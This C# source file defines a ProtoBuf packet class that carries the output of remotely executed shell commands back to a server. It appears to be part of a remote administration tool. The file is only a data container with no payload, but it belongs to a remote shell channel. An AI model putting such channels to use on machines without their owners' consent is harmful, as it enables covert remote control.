using ProtoBuf;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class DoShellExecuteResponse : IPacket
    {
        [ProtoMember(1)]
        public string Output { get; set; }

        [ProtoMember(2)]
        public bool IsError { get; private set; }

        public DoShellExecuteResponse()
        {
        }

        public DoShellExecuteResponse(string output, bool isError = false)
        {
            this.Output = output;
            this.IsError = isError;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}